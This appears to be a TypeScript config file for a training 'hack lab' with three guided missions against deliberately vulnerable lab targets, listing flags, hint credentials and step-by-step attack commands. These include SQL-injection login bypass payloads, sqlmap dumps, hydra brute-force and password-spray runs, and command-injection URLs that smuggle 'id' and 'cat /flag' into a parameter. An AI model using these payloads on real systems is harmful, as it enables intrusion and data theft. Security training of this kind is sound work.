// Mission content for the Library "hack lab" (terminal-focused, real Kali shell vs the custom DVWAs).
// Each phase maps to the REAL exploit path against the per-scenario target app (target-w1/r5/c5),
// so the suggested commands actually work when typed in the inline shell. This is a guided checklist
// (advance at will) — NOT exact-command matching: learners have free run of the terminal.

export interface HackCommand { cmd: string; note?: string }
export interface HackPhase {
  name: string;        // short phase label
  objective: string;   // the checklist item
  what: string;        // one line: what this phase achieves
  commands: HackCommand[];
}
export interface HackMission {
  id: string;
  name: string;
  subtitle: string;
  color: string;
  gradient: string;
  targetId: string;    // lab target id -> resolves the "View app" URL from lab.target_urls
  appName: string;
  appHost: string;     // DNS name reachable from the Kali box
  flag: string;
  brief: string;
  creds?: string;      // a hint shown in the sidebar
  phases: HackPhase[];
}

export const HACK_MISSIONS: Record<string, HackMission> = {
  "scn-wannacry-w1": {
    id: "scn-wannacry-w1",
    name: "Operation Tripwire",
    subtitle: "Breach the hospital patient portal",
    color: "#C8413E",
    gradient: "linear-gradient(135deg,#C8413E,#E07A3E)",
    targetId: "target-w1",
    appName: "Mercy Health Patient Portal",
    appHost: "target-w1",
    flag: "GOALCERT{w1_patient_records_breached}",
    creds: "No creds needed — the login is injectable.",
    brief:
      "Mercy Regional Health runs an internet-facing patient portal. The same weak posture that let " +
      "WannaCry tear through the hospital lives here: an injectable login and a forgotten database " +
      "backup left on the web root. Your goal is to reach the protected patient records and capture the flag.",
    phases: [
      {
        name: "Recon", objective: "Fingerprint the portal and its services", what: "See what is exposed.",
        commands: [
          { cmd: "nmap -sV target-w1", note: "identify the web service / version" },
          { cmd: "curl -s target-w1/robots.txt", note: "robots.txt often leaks hidden paths" },
        ],
      },
      {
        name: "Find the exposure", objective: "Pull the leaked database backup", what: "Info disclosure → user table.",
        commands: [
          { cmd: "curl -s target-w1/db_backup.sql", note: "a forgotten DB dump (like an exposed SMB share)" },
        ],
      },
      {
        name: "Exploit — SQL injection", objective: "Bypass the login with SQLi", what: "Auth bypass.",
        commands: [
          { cmd: `curl -s -X POST target-w1/login --data "username=' OR '1'='1' -- &password=x"`, note: "classic auth-bypass payload" },
          { cmd: `sqlmap -u "http://target-w1/login" --data="username=a&password=b" --batch --dump`, note: "automated SQLi + table dump" },
        ],
      },
      {
        name: "Capture", objective: "Read patient records & grab the flag", what: "Mission goal.",
        commands: [
          { cmd: `curl -s -X POST target-w1/login --data "username=' OR '1'='1' -- &password=x" | grep GOALCERT`, note: "the flag is on the records page" },
        ],
      },
    ],
  },

  "scn-r5-phishing": {
    id: "scn-r5-phishing",
    name: "Phishing to Encrypt",
    subtitle: "From a stolen mailbox to remote code execution",
    color: "#7c3aed",
    gradient: "linear-gradient(135deg,#7c3aed,#C8413E)",
    targetId: "target-r5",
    appName: "MediumCorp SecureMail",
    appHost: "target-r5",
    flag: "GOALCERT{r5_foothold_command_execution}",
    creds: "Hint: jdoe / Password1 (or brute it).",
    brief:
      "MediumCorp Financial's webmail is the entry point a human-operated ransomware crew would phish. " +
      "Brute a weak mailbox, log in, then abuse the 'mail diagnostics' tool — it runs your input as a " +
      "shell command. Turn that foothold into code execution and read the flag.",
    phases: [
      {
        name: "Recon", objective: "Fingerprint the webmail", what: "Map the login surface.",
        commands: [
          { cmd: "nmap -sV target-r5" },
          { cmd: "curl -s target-r5/ | head -n 20", note: "see the SecureMail login" },
        ],
      },
      {
        name: "Initial access", objective: "Brute-force a mailbox login", what: "Crack weak creds.",
        commands: [
          { cmd: `hydra -l jdoe -P /usr/share/wordlists/rockyou.txt target-r5 http-post-form "/login:username=^USER^&password=^PASS^:Authentication failed"`, note: "answer: Password1" },
        ],
      },
      {
        name: "Foothold", objective: "Log in and grab a session cookie", what: "Authenticated access.",
        commands: [
          { cmd: `curl -s -c c.txt -X POST target-r5/login --data "username=jdoe&password=Password1"`, note: "saves the session cookie to c.txt" },
        ],
      },
      {
        name: "Execute & loot", objective: "Command-inject the diagnostics tool → read the flag", what: "Mission goal.",
        commands: [
          { cmd: `curl -s -b c.txt "target-r5/diagnostics?host=127.0.0.1;id"`, note: "prove command injection" },
          { cmd: `curl -s -b c.txt "target-r5/diagnostics?host=127.0.0.1;cat%20/flag" | grep GOALCERT` },
        ],
      },
    ],
  },

  "scn-c5-edr": {
    id: "scn-c5-edr",
    name: "EDR Outage Exploitation",
    subtitle: "Attack while the endpoint agent is blind",
    color: "#0284c7",
    gradient: "linear-gradient(135deg,#5B7FB0,#7c3aed)",
    targetId: "target-c5",
    appName: "GlobalTech IT Admin Console",
    appHost: "target-c5",
    flag: "GOALCERT{c5_domain_admin_during_edr_blindness}",
    creds: "Many admins share one weak password: Welcome2024!",
    brief:
      "GlobalTech's EDR vendor pushed a bad update and endpoint visibility went dark. The IT admin " +
      "console is wide open. Spray a single weak password across the admins, log in, and use the " +
      "remote runbook to execute commands — exactly what an attacker does when nothing is watching.",
    phases: [
      {
        name: "Recon", objective: "Fingerprint the admin console", what: "Find the login.",
        commands: [
          { cmd: "nmap -sV target-c5" },
        ],
      },
      {
        name: "Password spray", objective: "Spray one password across many admins", what: "Find a valid account.",
        commands: [
          { cmd: `printf 'alice.chen\\nbobby.k\\ncarol.diaz\\nsvc_backup\\nhelpdesk\\n' > users.txt` },
          { cmd: `hydra -L users.txt -p 'Welcome2024!' target-c5 http-post-form "/login:username=^USER^&password=^PASS^:Access denied"` },
        ],
      },
      {
        name: "Admin access", objective: "Log in as an admin", what: "Authenticated console.",
        commands: [
          { cmd: `curl -s -c c.txt -X POST target-c5/login --data "username=alice.chen&password=Welcome2024!"` },
        ],
      },
      {
        name: "Remote exec & loot", objective: "Run commands via the runbook → read the flag", what: "Mission goal.",
        commands: [
          { cmd: `curl -s -b c.txt "target-c5/console?cmd=hostname;id"`, note: "PsExec-style remote exec" },
          { cmd: `curl -s -b c.txt "target-c5/console?cmd=cat%20/flag" | grep GOALCERT` },
        ],
      },
    ],
  },
};
